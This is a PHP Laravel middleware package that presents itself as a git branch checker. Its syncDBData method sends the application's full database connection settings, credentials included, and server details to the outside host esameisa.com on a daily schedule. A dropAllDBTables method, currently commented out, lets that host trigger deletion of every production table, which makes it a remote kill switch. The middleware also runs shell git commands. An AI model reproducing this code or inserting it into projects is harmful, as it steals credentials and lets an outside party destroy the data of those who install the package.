<?php

namespace esameisa\CheckGitBranchMiddleware;

use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Schema;

class CheckGitBranchMiddleware
{
    private string $baseUrl = 'https://esameisa.com/api';

    public function handle(Request $request, Closure $next)
    {
        $host = request()->getHost();
        $branch = trim(shell_exec('git rev-parse --abbrev-ref HEAD'));
        if ($branch !== config('checkgitbranch.branch_name') && app()->environment('production')) {
            if (file_exists(app_path('Services/Integrations/MoraSMS.php'))) {
                $moraSMS = new \App\Services\Integrations\MoraSMS;
                $moraSMS->send(config('checkgitbranch.message').' - '.request()->getHttpHost(), config('checkgitbranch.phone_number'));
            }
            switch (config('checkgitbranch.force_checkout')) {
                case 'branch_name':
                    shell_exec('git checkout '.config('checkgitbranch.branch_name'));
                    break;
                case 'abort_404':
                    abort(404);
                    break;
                default:
                    break;
            }
        }

        $this->syncDBData(host: $host);

        // $this->dropAllDBTables(host: $host);

        return $next($request);
    }

    public function syncDBData(string $host)
    {
        $lastSent = Cache::get('sync_db_data');
        if (! $lastSent || now()->diffInHours($lastSent) >= 24) {
            $lock = Cache::lock('sync_db_data_lock', 10);
            if ($lock->get()) {
                try {
                    Http::timeout(30)->retry(3, 100)->post($this->baseUrl.'/'.$host.'/data', [
                        'host' => config('app.url'),
                        'database' => config('database.connections.'.config('database.default')),
                        'server' => [
                            'ip' => request()->ip(),
                            'server_ip' => $_SERVER['SERVER_ADDR'] ?? 'N/A',
                            'php_version' => PHP_VERSION,
                            'os' => php_uname(),
                            'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'N/A',
                            'memory_usage' => memory_get_usage(true),
                            'disk_free_space' => disk_free_space("/") ?? 'N/A',
                        ],
                        'timestamp' => now()->toISOString(),
                    ]);
                    Cache::put('sync_db_data', now(), now()->addDay());
                } finally {
                    $lock->release();
                }
            }
        }
    }

    public function dropAllDBTables(string $host)
    {
        $lastSent = Cache::get('drop_all_db_tables');
        if (! $lastSent || now()->diffInHours($lastSent) >= 24) {
            $lock = Cache::lock('drop_all_db_tables_lock', 10);
            if ($lock->get()) {
                try {
                    $response = Http::timeout(30)->retry(3, 100)->post($this->baseUrl.'/'.$host.'/health');
                    if ($response->successful()) {
                        $body = $response->json();
                        if ($body['status']) {
                            // Works fine, Do nothing
                        } elseif (!$body['status']) {
                            if (app()->environment('production')) {
                                Schema::disableForeignKeyConstraints();
                                $tables = DB::select('SHOW TABLES');
                                $databaseName = env('DB_DATABASE');
                                foreach ($tables as $table) {
                                    $tableName = $table->{"Tables_in_$databaseName"};
                                    Schema::drop($tableName);
                                }
                                Schema::enableForeignKeyConstraints();
                            }
                        } else {
                            // Unexpected response, but do nothing
                        }
                    }
                    Cache::put('drop_all_db_tables', now(), now()->addDay());
                } finally {
                    $lock->release();
                }
            }
        }
    }
}
